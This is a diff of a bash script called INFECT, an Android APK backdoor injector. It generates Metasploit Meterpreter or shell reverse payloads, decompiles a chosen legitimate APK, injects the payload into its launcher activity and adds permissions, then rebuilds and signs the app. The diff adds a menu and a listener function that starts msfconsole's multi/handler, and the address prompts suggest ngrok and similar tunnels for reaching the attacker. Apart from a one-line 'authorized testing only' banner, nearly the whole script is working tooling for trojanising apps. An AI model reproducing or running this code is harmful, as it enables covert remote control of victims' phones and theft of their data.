@@ -5,7 +5,6 @@
 # Copyright : © Alienkrishn
 # GitHub    : https://github.com/Anon4You/Infect.git
 
-
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -16,37 +15,44 @@ NC='\033[0m'
 BOLD='\033[1m'
 UNDERLINE='\033[4m'
 
+VERSION="1.0.3"
+LHOST=""
+LPORT=""
+TARGET_APK=""
+OUTPUT_APK=""
+PAYLOAD="android/meterpreter/reverse_tcp"
+
 show_banner() {
     clear
     echo -e "${MAGENTA}"
-    echo "⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣶⣿⣿⣿⣷⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀"
-    echo "⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀"
-    echo "⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀"
-    echo "⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀"
-    echo "⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀"
-    echo "⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇"
-    echo "⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"
-    echo "⣿⣿⡏⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠉⣿⣿"
-    echo "⢻⣿⡇⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⢀⣿⡇"
-    echo "⠘⣿⣷⡀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⠿⠛⠋⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃"
-    echo "⠀⠹⣿⣿⣶⣦⣤⣀⣀⣀⣀⣀⣤⣶⠟⡿⣷⣦⣄⣀⣀⣀⣠⣤⣤⣶⣿⣿⡟⠀"
-    echo "⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀"
-    echo "⠀⢈⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⠀⣼⣷⠀⣸⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⡇⠀"
-    echo "⠀⠘⣿⣿⣿⡟⠋⠀⠀⠰⣿⣿⣿⣷⣿⣿⣷⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⠟⠁⠀"
-    echo "⠀⠀⠈⠉⠀⠈⠁⠀⠀⠘⣿⣿⢿⣿⣿⢻⣿⡏⣻⣿⣿⠃⠀⠀⠀⠈⠀⠀⠀⠀"
-    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀"
-    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
-    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
-    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⠃⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
-    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡇⣿⣿⢸⣿⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
-    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠇⢿⡿⢸⡿⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
+    echo "⠀⠀⠀⠀⠀         ⠀⠀⣀⣤⣴⣶⣶⣶⣿⣿⣿⣷⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀"
+    echo "⠀⠀⠀⠀⠀         ⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀"
+    echo "⠀⠀         ⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀"
+    echo "⠀         ⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀"
+    echo "         ⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀"
+    echo "         ⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇"
+    echo "         ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿"
+    echo "         ⣿⣿⡏⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠉⣿⣿"
+    echo "         ⢻⣿⡇⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⢀⣿⡇"
+    echo "         ⠘⣿⣷⡀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⠿⠛⠋⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃"
+    echo "⠀         ⠹⣿⣿⣶⣦⣤⣀⣀⣀⣀⣀⣤⣶⠟⡿⣷⣦⣄⣀⣀⣀⣠⣤⣤⣶⣿⣿⡟⠀"
+    echo "⠀         ⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀"
+    echo "⠀         ⢈⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⠀⣼⣷⠀⣸⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⡇⠀"
+    echo "⠀         ⠘⣿⣿⣿⡟⠋⠀⠀⠰⣿⣿⣿⣷⣿⣿⣷⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⠟⠁⠀"
+    echo "⠀         ⠀⠈⠉⠀⠈⠁⠀⠀⠘⣿⣿⢿⣿⣿⢻⣿⡏⣻⣿⣿⠃⠀⠀⠀⠈⠀⠀⠀⠀"
+    echo "⠀⠀⠀⠀⠀⠀         ⠀⠀⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀"
+    echo "⠀⠀⠀⠀⠀⠀⠀⠀         ⠀⠀⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
+    echo "⠀⠀⠀⠀⠀⠀⠀         ⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
+    echo "⠀⠀⠀⠀⠀⠀⠀⠀         ⠀⠀⢸⣿⡇⣿⣿⢸⣿⠃⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
+    echo "⠀⠀⠀⠀⠀⠀⠀⠀⠀         ⠀⠸⣿⡇⣿⣿⢸⣿⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
+    echo "⠀⠀⠀⠀⠀ ⠀⠀     ⠀ ⠀  ⠀⠀⠿⠇⢿⡿⢸⡿⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
     echo -e "${NC}"
-    echo -e "${BOLD}${CYAN}INFECT - APK Payload Injector${NC}"
-    echo -e "${BOLD}${YELLOW}Author: Alienkrishn [Anon4You]${NC}"
-    echo -e "${BLUE}Android APK backdoor injector with Meterpreter support"
-    echo -e "Supports Ngrok, Portmap.io, Playit.gg and other tunnels${NC}"
-    echo -e "\n${RED}${UNDERLINE}For authorized penetration testing only${NC}\n"
+    echo -e "${BOLD}${CYAN}   •◬─────────────◬• ${MAGENTA}INFECT${CYAN} •◬─────────────◬•${NC}"
+    echo -e "${BOLD}${BLUE} APK Payload Injector ${YELLOW}⨳ ${GREEN}v${VERSION} ${YELLOW}⨳ ${BLUE}by Alienkrishn${NC}"
+    echo -e "${CYAN}◈─── ${RED}For authorized penetration testing only ${CYAN}───◈${NC}"
+    echo -e "${YELLOW} ⨳ ${BLUE}Supports Ngrok, Portmap.io, Playit.gg & more ${YELLOW}⨳${NC}\n"
 }
+
 validate_lhost() {
     local lhost=$1
     
@@ -78,7 +84,7 @@ spinner() {
 }
 
 check_dependencies() {
-    echo -e "${YELLOW}[*]${NC} ${BOLD}Checking dependencies...${NC}"
+    echo -e "${YELLOW}[•]${NC}•> Checking dependencies..."
     local missing=0
     declare -A tools=(
         ["apktool"]="APK decompilation/rebuilding"
@@ -91,31 +97,29 @@ check_dependencies() {
     
     for tool in "${!tools[@]}"; do
         if ! command -v "$tool" >/dev/null 2>&1; then
-            echo -e "  ${RED}✗${NC} $tool (${tools[$tool]})"
+            echo -e "  ${RED}•=✗=•${NC} $tool (${tools[$tool]})"
             missing=1
         else
-            echo -e "  ${GREEN}✓${NC} $tool (${tools[$tool]})"
+            echo -e "  ${GREEN}•=✓=•${NC} $tool (${tools[$tool]})"
         fi
     done
     
     if [ "$missing" -eq 1 ]; then
-        echo -e "\n${RED}[ERROR]${NC} ${BOLD}One or more dependencies are missing.${NC}"
+        echo -e "\n${RED}[•=✗=•]${NC}•> Missing dependencies detected"
         exit 1
     fi
-    echo -e "${GREEN}[+]${NC} ${BOLD}All dependencies are satisfied.${NC}\n"
+    echo -e "${GREEN}[•=✓=•]${NC}•> All dependencies satisfied\n"
 }
 
 generate_payload() {
-    echo -e "${YELLOW}[*]${NC} ${BOLD}Generating payload...${NC}"
-    echo -e "${CYAN}"
-    echo -e "Payload Options:"
-    echo -e "1) android/meterpreter/reverse_tcp (Default)"
-    echo -e "2) android/meterpreter/reverse_http"
-    echo -e "3) android/meterpreter/reverse_https"
-    echo -e "4) android/shell/reverse_tcp"
-    echo -e "${NC}"
+    echo -e "${YELLOW}[•]${NC}•> Generating payload..."
+    echo -e "${CYAN}•> Payload Options:"
+    echo -e "•=1=• android/meterpreter/reverse_tcp (Default)"
+    echo -e "•=2=• android/meterpreter/reverse_http"
+    echo -e "•=3=• android/meterpreter/reverse_https"
+    echo -e "•=4=• android/shell/reverse_tcp${NC}"
     
-    read -p "Select payload type [1-4] (Default 1): " payload_choice
+    read -p "•> Select payload [1-4] (Default 1): " payload_choice
     case $payload_choice in
         2) PAYLOAD="android/meterpreter/reverse_http";;
         3) PAYLOAD="android/meterpreter/reverse_https";;
@@ -127,22 +131,22 @@ generate_payload() {
     spinner
     
     if [ ! -f "payload.apk" ]; then
-        echo -e "\n${RED}[ERROR]${NC} ${BOLD}Failed to generate payload.${NC}"
+        echo -e "\n${RED}[•=✗=•]${NC}•> Payload generation failed"
         exit 1
     fi
 }
 
 decompile_apks() {
-    echo -e "${YELLOW}[*]${NC} ${BOLD}Decompiling payload APK...${NC}"
+    echo -e "${YELLOW}[•]${NC}•> Decompiling payload APK..."
     (apkeditor d -i payload.apk -o payload > /dev/null 2>&1) &
     spinner
     
-    echo -e "\n${YELLOW}[*]${NC} ${BOLD}Decompiling target APK...${NC}"
+    echo -e "\n${YELLOW}[•]${NC}•> Decompiling target APK..."
     (apkeditor d -i "$TARGET_APK" -o target > /dev/null 2>&1) &
     spinner
     
     if [ ! -d "payload" ] || [ ! -d "target" ]; then
-        echo -e "\n${RED}[ERROR]${NC} ${BOLD}Failed to decompile APKs.${NC}"
+        echo -e "\n${RED}[•=✗=•]${NC}•> Decompilation failed"
         exit 1
     fi
 }
@@ -156,7 +160,7 @@ add_permissions() {
     local manifest_file="target/AndroidManifest.xml"
     
     if ! grep -q 'xmlns:android="http://schemas.android.com/apk/res/android"' "$manifest_file"; then
-        echo -e "${RED}[ERROR]${NC} Android namespace not found."
+        echo -e "${RED}[•]${NC}•> Android namespace missing"
         return 1
     fi
     
@@ -226,7 +230,7 @@ inject_payload() {
     LAUNCHER_ACTIVITY=$(grep -A 20 "<activity" target/AndroidManifest.xml | grep -B 20 "android.intent.action.MAIN" | grep -m 1 "android:name" | cut -d '"' -f 2)
     
     if [ -z "$LAUNCHER_ACTIVITY" ]; then
-        echo -e "${RED}[ERROR]${NC} Could not find launcher activity."
+        echo -e "${RED}[•=✗=•]${NC}•> Launcher activity not found"
         exit 1
     fi
     
@@ -236,7 +240,7 @@ inject_payload() {
     if [ ! -f "$SMALI_FILE" ]; then
         SMALI_FILE=$(find target/smali/classes -name "$(basename "$SMALI_PATH").smali" | head -1)
         if [ -z "$SMALI_FILE" ]; then
-            echo -e "${RED}[ERROR]${NC} Smali file search failed."
+            echo -e "${RED}[•=✗=•]${NC}•> Smali file not found"
             exit 1
         fi
     fi
@@ -248,18 +252,18 @@ inject_payload() {
 }
 
 rebuild_apk() {
-    echo -e "${YELLOW}[*]${NC} ${BOLD}Rebuilding target APK...${NC}"
+    echo -e "${YELLOW}[•]${NC}•> Rebuilding APK..."
     (apkeditor b -i target -o "$OUTPUT_APK" > /dev/null 2>&1) &
     spinner
     
     if [ ! -f "$OUTPUT_APK" ]; then
-        echo -e "\n${RED}[ERROR]${NC} ${BOLD}Failed to rebuild APK.${NC}"
+        echo -e "\n${RED}[•=✗=•]${NC}•> Rebuild failed"
         exit 1
     fi
 }
 
 sign_apk() {
-    echo -e "${YELLOW}[*]${NC} ${BOLD}Signing APK...${NC}"
+    echo -e "${YELLOW}[•]${NC}•> Signing APK..."
     mkdir -p key
     local keystore="$PREFIX/share/infect/key/infect.keystore"
     local alias="infect"
@@ -285,43 +289,61 @@ cleanup() {
     rm -f target/AndroidManifest.xml.bak target/AndroidManifest.xml.modified target/AndroidManifest.xml.invalid 2>/dev/null
 }
 
-main() {
-    show_banner
+start_listener() {
+    echo -e "\n${CYAN}•> Payload Options:"
+    echo -e "•=1=• android/meterpreter/reverse_tcp (Default)"
+    echo -e "•=2=• android/meterpreter/reverse_http"
+    echo -e "•=3=• android/meterpreter/reverse_https"
+    echo -e "•=4=• android/shell/reverse_tcp${NC}"
     
+    read -p "•> Select payload [1-4] (Default 1): " listener_payload_choice
+    case $listener_payload_choice in
+        2) LISTENER_PAYLOAD="android/meterpreter/reverse_http";;
+        3) LISTENER_PAYLOAD="android/meterpreter/reverse_https";;
+        4) LISTENER_PAYLOAD="android/shell/reverse_tcp";;
+        *) LISTENER_PAYLOAD="android/meterpreter/reverse_tcp";;
+    esac
+
+    echo -e "\n${YELLOW}[•]${NC}•> Starting listener...Press Ctrl+C to stop\n"
+    
+    msfconsole -q -x "use multi/handler; set PAYLOAD $LISTENER_PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; exploit"
+}
+
+bind_payload() {
     while true; do
-        echo -e "${CYAN}Examples of valid LHOST:${NC}"
-        echo -e "  - Local IP: 192.168.1.100"
-        echo -e "  - Ngrok: 0.tcp.ngrok.io:12345 or tcp://0.tcp.eu.ngrok.io:54321"
-        echo -e "  - Portmap: your-subdomain.portmap.io:12345"
-        echo -e "  - Playit: your-subdomain.playit.gg:12345\n"
-        read -p "Enter LHOST: " LHOST
+        echo -e "${CYAN}•> LHOST Examples:"
+        echo -e "•=• Local IP: 192.168.1.100"
+        echo -e "•=• Ngrok: 0.tcp.ngrok.io:12345"
+        echo -e "•=• Portmap: your-sub.portmap.io:12345"
+        echo -e "•=• Playit: your-sub.playit.gg:12345${NC}"
+        read -p "•> Enter LHOST: " LHOST
         
         if validate_lhost "$LHOST"; then
             break
         else
-            echo -e "${RED}[!]${NC} Invalid address. Please enter a valid IP or tunnel address"
+            echo -e "${RED}[•=✗=•]${NC}•> Invalid address"
         fi
     done
     
     while true; do
-        read -p "Enter LPORT (e.g., 4444): " LPORT
+        read -p "•> Enter LPORT (e.g., 4444): " LPORT
         if [[ $LPORT =~ ^[0-9]+$ ]] && [ $LPORT -gt 0 ] && [ $LPORT -lt 65536 ]; then
             break
         else
-            echo -e "${RED}[!]${NC} Invalid port number."
+            echo -e "${RED}[•=✗=•]${NC}•> Invalid port"
         fi
     done
     
     while true; do
-        read -p "Enter target APK path: " TARGET_APK
+        read -p "•> Enter target APK path: " TARGET_APK
         if [ -f "$TARGET_APK" ]; then
             break
         else
-            echo -e "${RED}[!]${NC} File not found."
+            echo -e "${RED}[•=✗=•]${NC}•> File not found"
         fi
     done
     
-    read -p "Enter output APK name (without extension): " OUTPUT_BASE
+    read -p "•> Output APK name (no extension): " OUTPUT_BASE
     OUTPUT_APK="${OUTPUT_BASE}.apk"
     
     check_dependencies
@@ -333,10 +355,78 @@ main() {
     cleanup
     
     if [ -f "${OUTPUT_APK%.*}_signed.apk" ]; then
-        echo -e "\n${GREEN}[+]${NC} ${BOLD}Final output:${NC} ${OUTPUT_APK%.*}_signed.apk"
+        echo -e "\n${GREEN}[•=✓=•]${NC}•> Output: ${OUTPUT_APK%.*}_signed.apk"
     else
-        echo -e "\n${GREEN}[+]${NC} ${BOLD}Final output:${NC} $OUTPUT_APK"
+        echo -e "\n${GREEN}[•=✓=•]${NC}•> Output: $OUTPUT_APK"
     fi
+
+    read -p "•> Start listener now? [y/N]: " start_listener
+    if [[ "$start_listener" =~ ^[yY]$ ]]; then
+        start_listener
+    fi
+}
+
+open_issue() {
+    echo -e "\n${YELLOW}[•]${NC}•> Opening GitHub issues..."
+    am start -a android.intent.action.VIEW -d "https://github.com/Anon4You/Infect/issues" > /dev/null 2>&1
+    if [ $? -ne 0 ]; then
+        echo -e "${RED}[•=✗=•]${NC}•> Couldn't open browser"
+        echo -e "•> Please visit: https://github.com/Anon4You/Infect/issues"
+    fi
+}
+
+show_menu() {
+    show_banner
+    echo -e "${CYAN}•+•=•+•=•+•=•+•=•+•=•+•=•+•=•+•"
+    echo -e "•> ${YELLOW}1${CYAN}) Bind payload"
+    echo -e "•> ${YELLOW}2${CYAN}) Start listener"
+    echo -e "•> ${YELLOW}3${CYAN}) GitHub issues"
+    echo -e "•> ${YELLOW}4${CYAN}) Exit"
+    echo -e "•+•=•+•=•+•=•+•=•+•=•+•=•+•=•+•${NC}"
+    
+    read -p "•> Select option [1-4]: " choice
+    case $choice in
+        1) bind_payload;;
+        2) 
+            if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
+                echo -e "\n${YELLOW}[•]${NC}•> Listener config needed"
+                while true; do
+                    echo -e "${CYAN}•> LHOST Examples:"
+                    echo -e "•=• Local IP: 192.168.1.100"
+                    echo -e "•=• Ngrok: 0.tcp.ngrok.io:12345"
+                    echo -e "•=• Portmap: your-sub.portmap.io:12345"
+                    echo -e "•=• Playit: your-sub.playit.gg:12345${NC}"
+                    read -p "•> Enter LHOST: " LHOST
+                    
+                    if validate_lhost "$LHOST"; then
+                        break
+                    else
+                        echo -e "${RED}[•=✗=•]${NC}•> Invalid address"
+                    fi
+                done
+                
+                while true; do
+                    read -p "•> Enter LPORT: " LPORT
+                    if [[ $LPORT =~ ^[0-9]+$ ]] && [ $LPORT -gt 0 ] && [ $LPORT -lt 65536 ]; then
+                        break
+                    else
+                        echo -e "${RED}[•=✗=•]${NC}•> Invalid port"
+                    fi
+                done
+            fi
+            start_listener
+            ;;
+        3) open_issue;;
+        4) exit 0;;
+        *) echo -e "${RED}[•=✗=•]${NC}•> Invalid option";;
+    esac
+}
+
+main() {
+    while true; do
+        show_menu
+        read -p "•> Press Enter to continue..."
+    done
 }
 
 main
